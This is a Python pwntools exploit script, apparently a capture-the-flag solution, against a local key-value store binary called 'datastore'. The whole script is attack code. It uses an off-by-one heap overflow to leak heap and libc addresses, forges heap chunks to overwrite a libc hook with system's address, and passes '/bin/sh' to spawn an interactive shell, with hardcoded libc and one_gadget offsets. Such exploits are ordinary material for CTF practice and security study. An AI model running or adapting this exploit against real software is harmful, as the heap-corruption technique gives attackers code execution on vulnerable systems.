#!/usr/bin/env python

from pwn import *
import sys

context.log_level = "debug"

elf = "./datastore"

p = process(elf)

def GET(key):
    p.sendline("GET")
    p.recvline("PROMPT: Enter row key:")
    p.sendline(key)

def PUT(key, size, data):
    p.sendline("PUT")
    p.recvline("PROMPT: Enter row key:")
    p.sendline(key)
    p.recvline("PROMPT: Enter data size:")
    p.sendline(str(size))
    p.recvline("PROMPT: Enter data:")
    p.send(data)

def DUMP():
    p.sendline("DUMP")

def DEL(key):
    p.sendline("DEL")
    p.recvline("PROMPT: Enter row key:")
    p.sendline(key)

system_off = 0x45390
realloc_hook_off = 0x3c4aed
malloc_hook_off = 0x3c4aed
free_hook_off = 0x3c6795
one_gadget1 = 0x45216
one_gadget2 = 0x4526a
one_gadget3 = 0xcd0f3
one_gadget4 = 0xcd1c8
one_gadget5 = 0xf0274
one_gadget6 = 0xf0280
one_gadget7 = 0xf1117
one_gadget8 = 0xf66c0

DEL("th3fl4g")

PUT("A"*0x8, 0x80, p8(0)*0x80)
PUT("B"*0x8, 0x18, p8(0)*0x18)
PUT("C"*0x8, 0x60, p8(0)*0x60)
PUT("C"*0x8, 0xf0, p8(0)*0xf0)
PUT("D"*0x8+p64(0)+p64(0x200), 0x20, p8(0)*0x20)  # off by one

DEL("A"*0x8)
DEL("C"*0x8)

PUT("a", 0x88, p8(0)*0x88)
DUMP()

p.recvuntil("INFO: Dumping all rows.\n")
temp = p.recv(11)
heap_base = u64(p.recv(6).ljust(8, "\x00"))-0x3f0
libc_base = int(p.recvline()[3:-7])-0x3c4b78

log.info("heap_base: " + hex(heap_base))
log.info("libc_base: " + hex(libc_base))

payload = p64(heap_base+0x70)
payload += p64(0x8)
payload += p64(heap_base+0x50)
payload += p64(0)*2
payload += p64(heap_base+0x250)
payload += p64(0)+p64(0x41)
payload += p64(heap_base+0x3e0)
payload += p64(0x88)
payload += p64(heap_base+0xb0)
payload += p64(0)*2
payload += p64(heap_base+0x250)
payload += p64(0)*5+p64(0x71)
payload += p64(libc_base+realloc_hook_off)
PUT("b"*0x8, 0xa8, payload)

payload = p64(0)*3+p64(0x41)
payload += p64(heap_base+0x290)
payload += p64(0x20)
payload += p64(heap_base+0x3b0)
payload += p64(0)*4+p64(0x21)
payload += p64(0)*3
PUT("c"*0x8, 0x78, payload)

payload = p64(0)+p64(0x41)
payload += p64(heap_base+0x90)
payload += p64(0x8)+p64(heap_base+0x230)
payload += p64(0)*2+p64(heap_base+0x250)
payload += p64(0x1)+p64(0)*3
PUT("d"*0x8, 0x60, payload)

#one_gadget = libc_base+one_gadget2
system_addr = libc_base+system_off
#payload = p8(0)*0x13
payload = p8(0)*0xb
#payload += p64(one_gadget)
payload += p64(system_addr)
#payload += p8(0)*0x45
payload += p8(0)*0x4d
PUT("e"*0x8, 0x60, payload)

#GET("")
payload = "/bin/sh"
payload += p8(0)*0x12
GET(payload)

p.interactive()
